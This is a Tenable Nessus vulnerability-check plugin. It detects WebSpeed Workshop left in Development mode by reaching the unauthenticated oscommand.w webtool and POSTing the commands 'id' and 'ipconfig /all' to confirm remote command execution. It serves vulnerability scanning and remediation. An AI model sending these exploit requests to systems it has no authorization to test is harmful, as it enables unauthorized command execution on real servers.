#
#  (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(25088);
  script_version("$Revision: 1.13 $");
  script_cvs_date("$Date: 2015/09/24 23:21:22 $");

  script_name(english:"WebSpeed Workshop Arbitrary Command Execution");
  script_summary(english:"Tries to execute a command using WebSpeed Workshop"); 
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts an application that allows for arbitrary
command execution." );
 script_set_attribute(attribute:"description", value:
"The remote web server appears to be using WebSpeed, a website creation
language used with database-driven websites. 

The installation of WebSpeed on the remote host is configured to
operate in 'Development' mode and allows access to the WebSpeed
Workshop, an environment intended for developing Web-based Internet
Transaction Processing applications.  The Workshop environment allows
for unauthenticated access to a number of tools, including one for
executing arbitrary commands on the remote host subject to the
privileges of the web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://communities.progress.com/pcom/index.jspa" );
 script_set_attribute(attribute:"solution", value:
"Change WebSpeed's Agent Application Mode to 'Production'." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_attribute(attribute:"plugin_publication_date", value: "2007/04/26");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, embedded: 0);

# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/scripts", "/cgi-public", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Loop over various standard WebSpeed Messenger scripts.
  foreach msgr (make_list("cgiip.exe", "wsisa.dll", "wsasp.dll", "wsnsa.dll", "wspd_cgi.sh"))
  {
    # See whether we can access the oscommand webtool.
    uri = string(dir, "/", msgr, "/WService=wsbroker1/webtools/oscommand.w");
    w = http_send_recv3(method:"GET", item:uri, port:port);
    if (isnull(w)) exit(0);
    res = w[2];

    # If so...
    if ("<TITLE>WebSpeed OS Command</TITLE>" >< res)
    {
      # Try to run a command.
      cmds = make_list("id", "ipconfig /all");
      foreach cmd (cmds)
      {
        postdata = string(
          "CODE=", urlencode(str:cmd), "&",
          "Run=Submit"
        );

	referer = build_url(port: port, qs: uri);

        w = http_send_recv3(method: "POST", item: uri, port: port,
	  add_headers: make_array("Referer", referer),
	  content_type: "application/x-www-form-urlencoded",
	  data: postdata );
	if (isnull(w)) exit(0);
	res = w[2];

        # There's a problem if our command ran.
        if (
          "<PRE>" >< res && "</PRE>" >< res &&
          (
            (cmd == "id" && egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res)) ||
            ("ipconfig" >< cmd && "Windows IP Configuration" >< res)
          )
        )
        {
          output = strstr(res, "<PRE>") - "<PRE>";
          output = output - strstr(output, "</PRE>");

          report = string(
            "\n",
            "Nessus was able to execute the command '", cmd, "' on the remote\n",
            "host, which produced the following output :\n",
            "\n",
            output
          );
          security_hole(port:port, extra:report);
          exit(0);
        }
      }
    }
  }
}
